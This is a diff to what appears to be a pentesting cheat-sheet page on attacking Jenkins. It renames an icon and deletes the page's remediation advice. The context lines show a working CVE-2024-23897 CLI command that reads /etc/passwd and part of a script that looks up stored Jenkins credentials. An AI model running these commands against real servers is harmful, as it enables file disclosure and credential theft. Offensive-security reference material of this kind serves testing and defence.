@@ -3,7 +3,7 @@ tags:
   - Web
 ---
 
-# :material-jenkins: Jenkins
+# :simple-jenkins: Jenkins
 
 <span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>
 
@@ -69,11 +69,6 @@ com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
 # CVE-2024-23897 — read arbitrary files via the built-in CLI
 java -jar jenkins-cli.jar -s http://$TARGET/ connect-node "@/etc/passwd"
 ```
-
-## :material-shield-check: Remediation
-
-- Never allow anonymous access; enable matrix/role auth; disable the CLI if unused.
-- Lock down the Script Console to admins; rotate stored credentials; patch promptly.
 
 ## :material-link-variant: Related
 
